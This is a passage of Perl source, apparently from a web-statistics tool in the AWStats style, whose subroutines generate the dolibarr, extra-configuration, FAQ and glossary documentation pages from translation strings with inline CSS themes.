	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--section-location:#3b82f6;--section-hooks:#10b981;--section-variables:#f59e0b;--section-accessible:#8b5cf6;--section-functions:#ec4899}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--section-location:#60a5fa;--section-hooks:#34d399;--section-variables:#fbbf24;--section-accessible:#a78bfa;--section-functions:#f472b6}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--link-color);padding-bottom:10px;font-size:2em}.subtitle{color:var(--text-color);opacity:0.8;font-style:italic;margin-bottom:30px;font-size:1.1em}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;box-shadow:0 2px 4px rgba(0,0,0,0.05)}.section h2{margin-top:0;padding-bottom:10px;border-bottom:2px solid;font-size:1.5em}.section-location h2{border-color:var(--section-location);color:var(--section-location)}.section-hooks h2{border-color:var(--section-hooks);color:var(--section-hooks)}.section-variables h2{border-color:var(--section-variables);color:var(--section-variables)}.section-accessible-vars h2{border-color:var(--section-accessible);color:var(--section-accessible)}.section-accessible-funcs h2{border-color:var(--section-functions);color:var(--section-functions)}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px;margin:20px 0}.info-box p{margin:10px 0}.info-box p:first-child{margin-top:0}.info-box p:last-child{margin-bottom:0}pre{background-color:var(--code-bg);padding:15px;border-radius:8px;overflow-x:auto;border:1px solid var(--border-color);font-family:'Monaco','Menlo',monospace;font-size:0.9em;margin:15px 0}code{background-color:var(--code-bg);padding:2px 6px;border-radius:4px;font-family:'Monaco','Menlo',monospace}.variable-list{list-style:none;padding:0;margin:15px 0}.variable-list li{margin:15px 0;padding:15px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px;transition:transform 0.2s}.variable-list li:hover{transform:translateX(5px);box-shadow:0 2px 8px rgba(0,0,0,0.1)}.variable-list li strong{color:var(--link-color);font-size:1.1em}.variable-list ul{margin:10px 0 0;padding-left:20px}.variable-list ul li{margin:5px 0;padding:0;background:none;border:none}.function-list{list-style:none;padding:0;margin:15px 0;display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:15px}.function-list li{padding:15px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px;transition:transform 0.2s}.function-list li:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,0.1)}.function-list li strong{color:var(--link-color);font-size:1.1em;display:block;margin-bottom:8px}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}\@media (max-width:768px){.function-list{grid-template-columns:1fr}}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
	</style>
	<h1>$doc_title</h1>
	<div class="subtitle">$subtitle</div>
	
	<div class="info-box">
		$intro
	</div>
	
	<div id="location" class="section section-location">
		<h2>$location_title</h2>
		<div class="info-box">
			$location_content
		</div>
	</div>
	
	<div id="hooks" class="section section-hooks">
		<h2>$hooks_title</h2>
		<div class="info-box">
			$hooks_content
		</div>
	</div>
	
	<div id="variables" class="section section-variables">
		<h2>$variables_title</h2>
		<div class="section">
			$devplugins_variables
		</div>
	</div>
	
	<div id="accessible-vars" class="section section-accessible-vars">
		<h2>$accessible_vars_title</h2>
		<div class="info-box">
			$accessible_vars_content
		</div>
	</div>
	
	<div id="accessible-funcs" class="section section-accessible-funcs">
		<h2>$accessible_funcs_title</h2>
		<div class="section">
			$devplugins_functions
		</div>
	</div>
	
	<hr>
	
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
	
$theme_script
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# 生成 dolibarr 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_dolibarr_doc {
	my ($dir) = @_;
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.dolibarr.title");
	my $full_title = "$doc_title - $page_title";
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $dolibarr_full = sprintf( _t("dolibarr.full"), $StatsUrl );
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--text-secondary:#6b7280;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--accent:#3b82f6;--surface:#ffffff;--surface-secondary:#f9fafb;--step-bg:#f3f4f6;--step-number:#3b82f6;--badge-bg:#e5e7eb}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--text-secondary:#9ca3af;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--accent:#60a5fa;--surface:#2d3748;--surface-secondary:#1f2937;--step-bg:#374151;--step-number:#60a5fa;--badge-bg:#374151}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}.container{width:100%}h1{color:var(--text-color);border-bottom:2px solid var(--accent);padding-bottom:10px;font-size:2em;margin-bottom:30px}h2{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:8px;font-size:1.5em;margin:30px 0 20px}h3{color:var(--text-color);font-size:1.3em;margin:25px 0 15px}.doc-card{background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;padding:25px;margin-bottom:30px}.module-card{background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:8px;padding:20px;margin-bottom:20px}.module-description{font-size:1.1rem;margin-bottom:20px}.badges{display:flex;gap:10px;flex-wrap:wrap;margin-top:10px}.badge{background-color:var(--badge-bg);border:1px solid var(--border-color);border-radius:20px;padding:5px 12px;font-size:0.9rem;font-weight:500}.feature-card{background-color:var(--surface);border:1px solid var(--border-color);border-radius:8px;padding:20px;margin:20px 0}.feature-icon{font-size:2em;margin-bottom:10px}.links-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px;margin:20px 0}.link-card{background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:8px;padding:20px;transition:transform 0.2s}.link-card:hover{transform:translateY(-2px)}.link-icon{font-size:1.8em;margin-bottom:10px}.link-title{font-weight:600;font-size:1.1rem;margin-bottom:8px}.link-url{margin:8px 0;word-break:break-all}.link-url a{font-size:0.9rem}.steps-container{display:flex;flex-direction:column;gap:15px;margin:20px 0}.step-card{background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:8px;padding:20px;position:relative}.step-number{position:absolute;top:-10px;left:20px;background-color:var(--step-number);color:white;width:30px;height:30px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold}.step-title{font-weight:600;font-size:1.1rem;margin-top:5px;margin-bottom:10px;padding-left:30px}.params-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;margin:20px 0}.param-card{background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:8px;padding:20px}.param-name{font-weight:600;color:var(--accent);margin-bottom:10px;font-size:1rem}.param-desc{font-size:0.95rem;color:var(--text-secondary)}.note-box{background-color:var(--surface-secondary);border-left:4px solid var(--accent);padding:15px;border-radius:4px;margin:20px 0}.code-inline{background-color:var(--code-bg);padding:2px 6px;border-radius:4px;font-family:'Monaco','Menlo',monospace;font-size:0.9rem}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}\@media (max-width:768px){.links-grid{grid-template-columns:1fr}.params-grid{grid-template-columns:1fr}}.screenshot-container{margin:20px 0;text-align:center;border:1px solid var(--border-color);border-radius:12px;padding:15px;background-color:var(--surface-secondary)}.screenshot{max-width:100%;height:auto;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}.screenshot-caption{margin-top:10px;color:var(--text-secondary);font-size:0.9em;font-style:italic}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
	</style>
	<div class="container">
		<div class="doc-card">
			<h1>$doc_title</h1>
		<div class="container">
			$dolibarr_full
		</div>
	</div>
	
	<hr>
	
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
	
$theme_script
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# 生成 extra 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_extra_doc {
	my ($dir) = @_;
	
	# 获取页面标题
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.extra.title");
	my $subtitle = _t("docs.extra.subtitle");
	my $full_title = "$doc_title - $page_title";
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $intro = _t("extra.intro");
	my $config_explanation = _t("extra.config.explanation");
	my $examples_title = _t("extra.examples.title");
	my $example_productorders = _t("extra.example.productorders");
	my $example_bugzilla = _t("extra.example.bugzilla");
	my $example_awredir = _t("extra.example.awredir");
	my $example_aborted = _t("extra.example.aborted");
	my $example_domainaliases = _t("extra.example.domainaliases");
	my $example_level2dir = _t("extra.example.level2dir");
	my $example1_title = _t("extra.example1.title");
	my $example1_desc = _t("extra.example1.desc");
	   $example1_desc =~ s/\\n/\n/g;
	my $example2_title = _t("extra.example2.title");
	my $example2_desc = _t("extra.example2.desc");
	   $example2_desc =~ s/\\n/\n/g;
	my $example3_title = _t("extra.example3.title");
	my $example3_desc = _t("extra.example3.desc");
	   $example3_desc =~ s/\\n/\n/g;
	my $example4_title = _t("extra.example4.title");
	my $example4_desc = _t("extra.example4.desc");
	   $example4_desc =~ s/\\n/\n/g;
	my $example5_title = _t("extra.example5.title");
	my $example5_desc = _t("extra.example5.desc");
	   $example5_desc =~ s/\\n/\n/g;
	my $example6_title = _t("extra.example6.title");
	my $example6_desc = _t("extra.example6.desc");
	   $example6_desc =~ s/\\n/\n/g;
	my $config_params_title = _t("extra.config.params.title");
	my $config_params_desc = _t("extra.config.params.desc");
	my $config_warning = _t("extra.config.warning");
	   $config_params_desc =~ s/\\n/\n/g;
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--accent:#3b82f6;--surface:#ffffff;--surface-secondary:#f9fafb;--example-bg:#f3f4f6}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--accent:#60a5fa;--surface:#2d3748;--surface-secondary:#1f2937;--example-bg:#374151}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--accent);padding-bottom:10px;font-size:2em;margin-bottom:20px}h2{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:8px;font-size:1.5em;margin:30px 0 20px}h3{color:var(--text-color);font-size:1.2em;margin:25px 0 15px;color:var(--accent)}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.info-box{background-color:var(--surface-secondary);border-left:4px solid var(--accent);padding:20px;border-radius:8px;margin:20px 0}.info-box p{margin:10px 0}.info-box p:first-child{margin-top:0}.info-box p:last-child{margin-bottom:0}.example-box{background-color:var(--example-bg);border:1px solid var(--border-color);border-radius:8px;padding:20px;margin:20px 0}.example-title{font-size:1.2em;font-weight:600;color:var(--accent);margin-bottom:15px}pre{background-color:var(--code-bg);padding:15px;border-radius:8px;overflow-x:auto;border:1px solid var(--border-color);font-family:'Monaco','Menlo',monospace;font-size:0.9rem;margin:15px 0}code{background-color:var(--code-bg);padding:2px 6px;border-radius:4px;font-family:'Monaco','Menlo',monospace;font-size:0.9rem}.example-list{list-style:none;padding:0;margin:20px 0;display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:10px}.example-list li{margin:0}.example-list a{display:block;padding:10px 15px;background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:6px;transition:transform 0.2s}.example-list a:hover{transform:translateX(5px);background-color:var(--border-color);text-decoration:none}.param-table{width:100%;border-collapse:collapse;margin:20px 0}.param-table th{background-color:var(--header-bg);padding:10px;text-align:left;border:1px solid var(--border-color)}.param-table td{padding:10px;border:1px solid var(--border-color)}.param-table tr:hover{background-color:var(--surface-secondary)}.warning-note{background-color:#fff3cd;border:1px solid #ffeeba;color:#856404;padding:15px;border-radius:8px;margin:20px 0}[data-theme="dark"] .warning-note{background-color:#332e1c;border-color:#665c2c;color:#ffd966}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}\@media (max-width:768px){.example-list{grid-template-columns:1fr}}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
	</style>
	<h1>$doc_title</h1>
	<div class="info-box">
		$intro
	</div>
	<div class="info-box">
		$config_explanation
	</div>
	<h2 id="examples">📋 $examples_title</h2>
	<ul class="example-list">
		<li><a href="#productorders">$example_productorders</a></li>
		<li><a href="#bugzilla">$example_bugzilla</a></li>
		<li><a href="#awredir">$example_awredir</a></li>
		<li><a href="#aborted">$example_aborted</a></li>
		<li><a href="#domainaliases">$example_domainaliases</a></li>
		<li><a href="#level2dir">$example_level2dir</a></li>
	</ul>
	<h3 id="productorders">📌 $example1_title</h3>
	<div class="example-box">
		$example1_desc
	</div>
	<h3 id="bugzilla">📌 $example2_title</h3>
	<div class="example-box">
		$example2_desc
	</div>
	<h3 id="awredir">📌 $example3_title</h3>
	<div class="example-box">
		$example3_desc
	</div>
	<h3 id="aborted">📌 $example4_title</h3>
	<div class="example-box">
		$example4_desc
	</div>
	<h3 id="domainaliases">📌 $example5_title</h3>
	<div class="example-box">
		$example5_desc
	</div>
	<h3 id="level2dir">📌 $example6_title</h3>
	<div class="example-box">
		$example6_desc
	</div>
	<h2 id="extraconfig">⚙️ $config_params_title</h2>
	<div class="info-box">
		$config_params_desc
	</div>
	
	<div class="warning-note">
		$config_warning
	</div>
	
	<hr>
	
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
	
$theme_script
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# 生成 faq 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_faq_doc {
	my ($dir) = @_;
	
	# 获取页面标题
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.faq.title");
	my $subtitle = _t("docs.faq.subtitle");
	my $full_title = "$doc_title - $page_title";
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $faq_content = _t("faq.complete");
	   $faq_content =~ s/\\n/\n/g;
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-primary:#ffffff;--bg-secondary:#f8f9fa;--bg-code:#f2f4f6;--text-primary:#212529;--text-secondary:#495057;--text-muted:#6c757d;--link-color:#0d6efd;--link-hover:#0a58ca;--border-color:#dee2e6;--heading-color:#1a2b3c;--accent-light:#e7f1ff;--accent-border:#9ec5fe;--code-color:#d63384;--shadow-sm:0 1px 2px rgba(0,0,0,0.05);--shadow-md:0 4px 6px rgba(0,0,0,0.1);--card-bg:#ffffff;--header-bg:#f8f9fa;--accent:#0a58ca}[data-theme="dark"]{--bg-primary:#1e1e2f;--bg-secondary:#2d2d3f;--bg-code:#2a2a3c;--text-primary:#e4e6eb;--text-secondary:#b0b3b8;--text-muted:#8c8f94;--link-color:#8cb4ff;--link-hover:#a6c8ff;--border-color:#3e3e5e;--heading-color:#cfd9e6;--accent-light:#2c3a5e;--accent-border:#4f6b9c;--code-color:#f08d8d;--shadow-sm:0 1px 2px rgba(0,0,0,0.3);--shadow-md:0 4px 8px rgba(0,0,0,0.5);--card-bg:#2d2d3f;--header-bg:#2a2a3c;--accent:#a6c8ff}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;line-height:1.6;color:var(--text-primary);background-color:var(--bg-primary);margin:0;padding:20px;transition:background-color 0.3s ease,color 0.2s ease;scroll-behavior:smooth;max-width:1200px;margin:0 auto}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}h1{font-size:2.4rem;font-weight:600;color:var(--heading-color);border-bottom:3px solid var(--link-color);padding-bottom:12px;margin:1.5rem 0 0.5rem;letter-spacing:-0.02em}h1:first-of-type{margin-top:0.5rem}.subtitle{font-size:1.2rem;color:var(--text-secondary);margin:-5px 0 25px 0;font-style:italic}h2{font-size:2rem;font-weight:500;color:var(--heading-color);border-left:6px solid var(--link-color);padding-left:16px;margin:2.2rem 0 1.2rem 0;background:linear-gradient(to right,var(--bg-secondary),transparent);padding:12px 0 12px 16px;border-radius:0 8px 8px 0}h3{font-size:1.5rem;font-weight:500;color:var(--heading-color);margin:1.8rem 0 1rem 0;padding-bottom:5px;border-bottom:2px dashed var(--border-color)}h3[id]{scroll-margin-top:20px}h3[id]::before{content:"🔗 ";color:var(--link-color);font-size:1.3rem;opacity:0.7;margin-right:4px}ul,ol{padding-left:1.8rem}li{margin:8px 0;color:var(--text-secondary)}h2 + ul,h2 + ul ul{background:var(--bg-secondary);padding:18px 18px 18px 38px;border-radius:12px;box-shadow:var(--shadow-sm);border:1px solid var(--border-color);list-style-type:none}h2 + ul li{margin:8px 0;position:relative}h2 + ul li::before{content:"▹";color:var(--link-color);font-weight:bold;position:absolute;left:-22px;font-size:1.2rem}p{color:var(--text-primary);margin:1rem 0;line-height:1.7}strong{color:var(--heading-color);font-weight:600}p strong:first-child{color:var(--link-color);font-size:1.05em}code,pre{font-family:"SF Mono",Menlo,Monaco,Consolas,"Courier New",monospace;font-size:0.9em;background-color:var(--bg-code);border:1px solid var(--border-color);border-radius:6px}code{color:var(--code-color);padding:0.2em 0.4em;white-space:nowrap}pre{display:block;padding:16px;margin:16px 0;line-height:1.45;overflow-x:auto;border-radius:8px;white-space:pre;word-wrap:normal;box-shadow:inset 0 0 0 1px var(--border-color);background-color:var(--bg-secondary)}pre code{background:none;border:none;color:var(--text-primary);padding:0;white-space:pre;font-size:0.9rem}blockquote,.note{background:var(--accent-light);border-left:5px solid var(--accent-border);padding:1rem 1.5rem;margin:1.5rem 0;border-radius:0 12px 12px 0;color:var(--text-secondary);font-style:normal;box-shadow:var(--shadow-sm)}blockquote p:last-child,.note p:last-child{margin-bottom:0}hr{border:none;border-top:2px solid var(--border-color);margin:2.5rem 0;opacity:0.5}table{width:100%;border-collapse:collapse;margin:1.5rem 0;background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:12px;overflow:hidden}th{background-color:var(--heading-color);color:var(--bg-primary);font-weight:600;padding:12px;text-align:left}td{padding:10px 12px;border-top:1px solid var(--border-color);color:var(--text-primary)}tr:nth-child(even){background-color:var(--bg-code)}html{scroll-padding-top:20px;scroll-behavior:smooth}h2 + ul a{transition:transform 0.2s,color 0.2s;display:inline-block}h2 + ul a:hover{transform:translateX(6px)}[dir="rtl"]{text-align:right}[dir="rtl"] h2{border-left:none;border-right:6px solid var(--link-color);padding-left:0;padding-right:16px;background:linear-gradient(to left,var(--bg-secondary),transparent)}[dir="rtl"] h2 + ul{padding-left:18px;padding-right:38px}[dir="rtl"] h2 + ul li::before{left:auto;right:-22px}[dir="rtl"] blockquote{border-left:none;border-right:5px solid var(--accent-border);border-radius:12px 0 0 12px}\@media (max-width:768px){body{padding:15px}h1{font-size:2rem}h2{font-size:1.6rem}h3{font-size:1.3rem}ul,ol{padding-left:1.2rem}h2 + ul{padding:15px 15px 15px 30px}}\@media (max-width:480px){body{padding:10px}h1{font-size:1.7rem}h2{font-size:1.4rem;padding:8px 0 8px 12px}pre{padding:10px;font-size:0.85rem}code{white-space:normal;word-break:break-word}}\@media print{body{background:white;color:black;padding:0.5in}a{color:black;text-decoration:underline;border:none}pre,code{background:#f5f5f5;border:1px solid #ccc;color:black}h2,h3{page-break-after:avoid}h2 + ul{background:none;border:1px solid #aaa;box-shadow:none}}a[href^="#"]::before{content:"⚓ ";font-size:0.9em;opacity:0.6}h2 + ul a[href^="#"]::before{content:none}[id]{scroll-margin-top:30px}
	</style>
	<h1>$doc_title</h1>
	<div class="subtitle">$subtitle</div>
	$faq_content
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
	</div>
	
$theme_script
END_HTML
	print $html;
}

#------------------------------------------------------------------------------
# 生成 glossary 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_glossary_doc {
	my ($dir) = @_;
	
	# 获取页面标题
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
	my $doc_title = _t("docs.glossary.title");
	my $subtitle = _t("docs.glossary.subtitle");
	my $full_title = "$doc_title - $page_title";
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $glossary_unique_visitor = _t("glossary.unique_visitor");
	my $glossary_visits = _t("glossary.visits");
	my $glossary_pages = _t("glossary.pages");
	my $glossary_hits = _t("glossary.hits");
	my $glossary_bandwidth = _t("glossary.bandwidth");
	my $glossary_entry_page = _t("glossary.entry_page");
	my $glossary_exit_page = _t("glossary.exit_page");
	my $glossary_session_duration = _t("glossary.session_duration");
	my $glossary_grabber = _t("glossary.grabber");
	my $glossary_direct_access = _t("glossary.direct_access");
	my $glossary_add_to_favourites = _t("glossary.add_to_favourites");
	my $glossary_http_title = _t("glossary.http.title");
	my $glossary_http_intro = _t("glossary.http.intro");
	my $glossary_http_classes = _t("glossary.http.classes");
	my $glossary_http_1xx = _t("glossary.http.1xx");
	my $glossary_http_2xx = _t("glossary.http.2xx");
	my $glossary_http_3xx = _t("glossary.http.3xx");
	my $glossary_http_4xx = _t("glossary.http.4xx");
	my $glossary_http_5xx = _t("glossary.http.5xx");
	my $glossary_smtp_title = _t("glossary.smtp.title");
	my $glossary_smtp_intro = _t("glossary.smtp.intro");
	my $glossary_smtp_2xx = _t("glossary.smtp.2xx");
	my $glossary_smtp_4xx = _t("glossary.smtp.4xx");
	my $glossary_smtp_5xx = _t("glossary.smtp.5xx");
	my $footer_author = _t("glossary.footer.author");
	my $footer_twitter = _t("glossary.footer.twitter");
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--accent:#3b82f6;--surface:#ffffff;--surface-secondary:#f9fafb;--glossary-term:#3b82f6;--glossary-http:#10b981;--glossary-smtp:#8b5cf6;--table-header:#e5e7eb;--table-row-even:#f9fafb}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--accent:#60a5fa;--surface:#2d3748;--surface-secondary:#1f2937;--glossary-term:#60a5fa;--glossary-http:#34d399;--glossary-smtp:#a78bfa;--table-header:#374151;--table-row-even:#1f2937}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--accent);padding-bottom:10px;font-size:2em;margin-bottom:20px}.subtitle{color:var(--text-color);opacity:0.8;font-style:italic;margin-bottom:30px;font-size:1.1em}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.glossary-section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;box-shadow:0 2px 4px rgba(0,0,0,0.05)}.glossary-section h2{margin-top:0;padding-bottom:10px;border-bottom:2px solid;font-size:1.5em}.glossary-basic h2{border-color:var(--glossary-term);color:var(--glossary-term)}.glossary-http h2{border-color:var(--glossary-http);color:var(--glossary-http)}.glossary-smtp h2{border-color:var(--glossary-smtp);color:var(--glossary-smtp)}.term-card{margin:25px 0;padding:20px;background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:8px;transition:transform 0.2s,box-shadow 0.2s;scroll-margin-top:80px}.term-card:hover{transform:translateX(5px);box-shadow:0 4px 12px rgba(0,0,0,0.1)}.term-card h3{margin-top:0;color:var(--link-color);font-size:1.3em;border-bottom:1px solid var(--border-color);padding-bottom:8px}.term-card h4{color:var(--text-color);font-size:1.1em;margin:15px 0 10px}.term-card p{margin:10px 0}.term-card ul,.term-card ol{margin:10px 0;padding-left:25px}.term-card li{margin:3px 0}.term-card pre{background-color:var(--code-bg);padding:12px;border-radius:6px;overflow-x:auto;border:1px solid var(--border-color);font-family:'Monaco','Menlo',monospace;font-size:0.9rem}.term-card code{background-color:var(--code-bg);padding:2px 6px;border-radius:4px;font-family:'Monaco','Menlo',monospace;font-size:0.9rem}.code-table{width:100%;border-collapse:collapse;margin:15px 0;border:1px solid var(--border-color);border-radius:8px;overflow:hidden}.code-table th{background-color:var(--table-header);padding:10px;text-align:left;font-weight:600}.code-table td{padding:8px 10px;border-top:1px solid var(--border-color)}.code-table tr:nth-child(even){background-color:var(--table-row-even)}.code-table tr:hover{background-color:var(--border-color)}.code-table td:first-child{font-family:'Monaco','Menlo',monospace;font-weight:600;width:80px}.glossary-note{background-color:var(--header-bg);border-left:4px solid var(--accent);padding:15px;border-radius:4px;margin:15px 0}.glossary-note p{margin:5px 0}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}.footer-note{margin-top:40px;padding:20px;background-color:var(--header-bg);border-radius:8px;text-align:center;font-size:0.9em}\@media (max-width:768px){.term-card:hover{transform:none}.code-table{font-size:0.9rem}.code-table td:first-child{width:60px}}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
	</style>
	<h1>$doc_title</h1>
	<div class="subtitle">$subtitle</div>
	<div id="basic" class="glossary-section glossary-basic">
		<div id="UniqueVisitor" class="term-card">$glossary_unique_visitor</div>
		<div id="Visits" class="term-card">$glossary_visits</div>
		<div id="Pages" class="term-card">$glossary_pages</div>
		<div id="Hits" class="term-card">$glossary_hits</div>
		<div id="Bandwidth" class="term-card">$glossary_bandwidth</div>
		<div id="EntryPage" class="term-card">$glossary_entry_page</div>
		<div id="ExitPage" class="term-card">$glossary_exit_page</div>
		<div id="SessionDuration" class="term-card">$glossary_session_duration</div>
		<div id="Grabber" class="term-card">$glossary_grabber</div>
		<div id="Direct" class="term-card">$glossary_direct_access</div>
		<div id="AddToFavourites" class="term-card">$glossary_add_to_favourites</div>
	</div>
	<div id="http" class="glossary-section glossary-http">
		<h2>$glossary_http_title</h2>
		
